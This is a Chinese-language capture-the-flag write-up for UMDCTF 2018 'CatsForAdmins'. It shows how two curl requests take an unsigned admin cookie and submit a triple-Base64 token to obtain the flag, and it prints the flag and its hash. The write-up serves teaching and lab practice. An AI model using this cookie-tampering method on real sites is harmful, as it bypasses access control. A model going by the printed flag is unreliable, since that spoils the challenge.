# UMDCTF 2018 - CatsForAdmins

## 题目简述

站点声称猫图和 flag 只供管理员访问。源码显示权限完全由客户端可见的 `accesslevel` Cookie 决定，同时还要求提交一个多层 Base64 编码的访问令牌。

## 解题过程

全局中间件会把 `accesslevel` 设置为 `user`，但访问 `/cats` 时，后续中间件又把同名 Cookie 设置为 `admin`。因此先请求 `/cats`，保存服务端下发的管理员 Cookie：

```bash
curl -c cookies.txt http://target/cats
```

`POST /flag` 会读取请求中已有的 Cookie；本次响应即使又设置 `user`，也不会改变当前处理函数已经解析出的 `req.cookies`。接下来还需要满足：

```javascript
req.body.accessToken == "V1RKR01HTjNiejBLCg=="
```

该令牌连续做三次 Base64 解码的过程是：

```text
V1RKR01HTjNiejBLCg==
-> WTJGMGN3bz0K
-> Y2F0cwo=
-> cats
```

向接口提交源码中的外层令牌：

```bash
curl -b cookies.txt \
  -d 'accessToken=V1RKR01HTjNiejBLCg==' \
  http://target/flag
```

响应仍是一层 Base64：

```text
VU1EQ1RGLXt0SDNfaW5UM3JuM3RfMXNfbUBkM18wZl9jQHRafQ==
```

解码得到：

```text
UMDCTF-{tH3_inT3rn3t_1s_m@d3_0f_c@tZ}
```

README 的 SHA-256 同样按 flag 后带换行符计算，结果为：

```text
3c14103eb3d2f0241171a8f1f96f56378927edcb79171e577bbbf89d4ea64cdd
```

## 方法总结

把权限等级直接放在未签名 Cookie 中无法建立可信身份。本题还叠加了 Base64，但编码既不保密也不防篡改；分析时应分别梳理 Cookie 的设置顺序、接口实际比较的字节串和响应的编码层数。
